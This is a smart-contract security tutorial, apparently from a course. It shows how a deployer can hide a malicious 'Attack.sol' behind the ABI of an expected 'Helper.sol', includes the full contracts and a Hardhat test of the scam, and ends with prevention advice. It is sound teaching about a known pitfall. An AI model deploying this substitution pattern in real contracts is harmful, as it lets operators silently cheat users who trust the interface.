# Malicious External Contracts

In crypto world, you will often hear about how contracts which looked legitimate were the reason behind a big scam. How are hackers able to execute malicious code from a legitimate looking contract?

We will learn one method today 👀

## What will happen?

There will be three contracts - `Attack.sol`, `Helper.sol` and `Good.sol`. User will be able to enter an eligibility list using `Good.sol` which will further call `Helper.sol` to keep track of all the users which are eligible.

`Attack.sol` will be designed in such a way that eligibility list can be manipulated, lets see how 👀

## Build

Lets build an example where you can experience how the attack happens.

- To setup a Hardhat project, Open up a terminal and execute these commands

  ```bash
  npm init --yes
  npm install --save-dev hardhat
  ```
- If you are on Windows, please do this extra step and install these libraries as well :)

  ```bash
  npm install --save-dev @nomiclabs/hardhat-waffle ethereum-waffle chai @nomiclabs/hardhat-ethers ethers
  ```

- In the same directory where you installed Hardhat run:

  ```bash
  npx hardhat
  ```

  - Select `Create a basic sample project`
  - Press enter for the already specified `Hardhat Project root`
  - Press enter for the question on if you want to add a `.gitignore`
  - Press enter for `Do you want to install this sample project's dependencies with npm (@nomiclabs/hardhat-waffle ethereum-waffle chai @nomiclabs/hardhat-ethers ethers)?`

Now you have a Hardhat project ready to go!

Start by creating a new file inside the `contracts` directory called `Good.sol`

```solidity
//SPDX-License-Identifier: MIT
pragma solidity ^0.8.4;
import "./Helper.sol";

contract Good {
    Helper helper;
    constructor(address _helper) payable {
        helper = Helper(_helper);
    }

    function isUserEligible() public view returns(bool) {
        return helper.isUserEligible(msg.sender);
    }

    function addUserToList() public  {
        helper.setUserEligible(msg.sender);
    }

    fallback() external {}
    
}
```

After creating `Good.sol`, create a new file inside the `contracts` directory named `Helper.sol`

```solidity
//SPDX-License-Identifier: MIT
pragma solidity ^0.8.4;

contract Helper {
    mapping(address => bool) userEligible;

    function isUserEligible(address user) public view returns(bool) {
        return userEligible[user];
    }

    function setUserEligible(address user) public {
        userEligible[user] = true;
    }

    fallback() external {}
}
```

The last contract that we will create inside the `contracts` directory is `Attack.sol`

```solidity
//SPDX-License-Identifier: MIT
pragma solidity ^0.8.4;

contract Attack {
    address owner;
    mapping(address => bool) userEligible;

    constructor() {
        owner = msg.sender;
    }

    function isUserEligible(address user) public view returns(bool) {
        if(user == owner) {
            return true;
        }
        return false;
    }

    function setUserEligible(address user) public {
        userEligible[user] = true;
    }
    
    fallback() external {}
}
```


You will notice that the fact about `Attack.sol` is that it will generate the same ABI as `Helper.sol` eventhough it has different code within it. This is because ABI only contains function definitions for public variables, functions and events. So `Attack.sol` can be typecasted as `Helper.sol`.

Now because `Attack.sol` can be typecasted as `Helper.sol`, a malicious owner can deploy `Good.sol` with the address of `Attack.sol` instead of `Helper.sol` and users will believe that he is indeed using `Helper.sol` to create the eligibility list.

In our case, the scam will happen as follows. The scammer will first deploy `Good.sol` with the address of `Attack.sol`. Then when the user will enter the eligibility list using `addUserToList` function which will work fine because the code for this function is same within `Helper.sol` and `Attack.sol`.

The true colours will be observed when the user will try to call `isUserEligible` with his address because now this function will always return `false`  because it calls `Attack.sol`'s `isUserEligible` function which always returns `false` except when its the owner itself, which was not supposed to happen.


Lets try to write a test and see if this scam actually works, create a new file inside the `test` folder named `attack.js`

```javascript
const { expect } = require("chai");
const { BigNumber } = require("ethers");
const { ethers, waffle } = require("hardhat");

describe("Attack", function () {
  it("Should change the owner of the Good contract", async function () {
    // Deploy the Attack contract
    const attackContract = await ethers.getContractFactory("Attack");
    const _attackContract = await attackContract.deploy();
    await _attackContract.deployed();
    console.log("Attack Contract's Address", _attackContract.address);

    // Deploy the good contract
    const goodContract = await ethers.getContractFactory("Good");
    const _goodContract = await goodContract.deploy(_attackContract.address, {
      value: ethers.utils.parseEther("3"),
    });
    await _goodContract.deployed();
    console.log("Good Contract's Address:", _goodContract.address);

    const [_, addr1] = await ethers.getSigners();
    // Now lets add an address to the eligibility list
    let tx = await _goodContract.connect(addr1).addUserToList();
    await tx.wait();

    // check if the user is eligible
    const eligible = await _goodContract.connect(addr1).isUserEligible();
    expect(eligible).to.equal(false);
  });
});

```


To run this test, open up your terminal pointing to the root of the directory for this level and execute this command:

```bash
npx hardhat test
```

If all your tests passed, this means that the scam was successful and that the user will never be determined eligible 


## Prevention

Make the address of the external contract public and also get your external contract verified so that all users can view the code

Create a new contract, instead of typecasting an address into a contract inside the constructor. So instead of doing `Helper(_helper)`  where you are typecasting `_helper` address into a contract which may or may not be the `Helper` contract, create an explicit new helper contract instance using `new Helper()`.

Example
```solidity
contract Good {
    Helper public helper;
    constructor() {
        helper = new Helper();
    }
```

<Quiz questionId="4e4b7aa2-7d27-4f2d-b66f-d2a3a04adb27" />
<Quiz questionId="d7194a5e-fe17-420f-8dc8-1789665d0fe5" />

Wow, lots of learning right? 🤯 

Beaware of scammers, you might need to double check the code of a new dApp you want to put money in.

<SubmitQuiz />
